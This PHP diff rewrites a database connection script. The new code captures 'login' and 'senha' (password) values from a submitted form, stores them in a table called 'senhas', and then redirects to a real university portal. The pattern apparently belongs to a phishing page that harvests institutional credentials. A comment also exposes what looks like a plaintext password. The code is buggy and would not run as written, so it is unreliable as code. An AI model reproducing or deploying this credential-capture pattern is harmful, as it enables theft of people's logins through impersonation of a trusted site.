@@ -1,9 +1,9 @@
 <?php
 
-$connectstr_dbhost = '';
-$connectstr_dbname = '';
-$connectstr_dbusername = '';
-$connectstr_dbpassword = '';
+$dbhost = '';
+$dbname = '';
+$dbusername = '';
+$dbpassword = '';
 
 
 foreach ($_SERVER as $key => $value) {
@@ -11,24 +11,24 @@ foreach ($_SERVER as $key => $value) {
         continue;
     }
 
-    $connectstr_dbhost = preg_replace("/^.*Data Source=(.+?);.*$/", "\\1", $value);
-    $connectstr_dbname = preg_replace("/^.*Database=(.+?);.*$/", "\\1", $value);
-    $connectstr_dbusername = preg_replace("/^.*User Id=(.+?);.*$/", "\\1", $value);
-    $connectstr_dbpassword = preg_replace("/^.*Password=(.+?)$/", "\\1", $value);
+    $dbhost = preg_replace("/^.*Data Source=(.+?);.*$/", "\\1", $value);
+    $dbname = preg_replace("/^.*Database=(.+?);.*$/", "\\1", $value);
+    $dbusername = preg_replace("/^.*User Id=(.+?);.*$/", "\\1", $value);
+    $dbpassword = preg_replace("/^.*Password=(.+?)$/", "\\1", $value);
 }
 
-var_dump($connectstr_dbhost, $connectstr_dbname, $connectstr_dbpassword, $connectstr_dbusername);
+//6#vWHD_$
+//localdb
 
-$link = mysqli_connect($connectstr_dbhost, $connectstr_dbusername, $connectstr_dbpassword,$connectstr_dbname);
+$conn = new mysqli_connect($dbhost, $dbusername, $dbpassword, 'localdb');
 
-if (!$link) {
-    echo "Error: Unable to connect to MySQL." . PHP_EOL;
-    echo "Debugging errno: " . mysqli_connect_errno() . PHP_EOL;
-    echo "Debugging error: " . mysqli_connect_error() . PHP_EOL;
-    exit;
+if (!$conn->connect_errno) {
+    $stmt = $obj_mysqli->prepare("INSERT INTO senhas (login, senha) VALUES (?,?)");
+
+    $stmt->bind_param('ss', $_POST['login'], $_POST['senha']);
+    $stmt->execute();
 }
 
-echo "Success: A proper connection to MySQL was made! The my_db database is great." . PHP_EOL;
-echo "Host information: " . mysqli_get_host_info($link) . PHP_EOL;
+$conn->close();
 
-mysqli_close($link);
+header('https://portalif.iftm.edu.br');
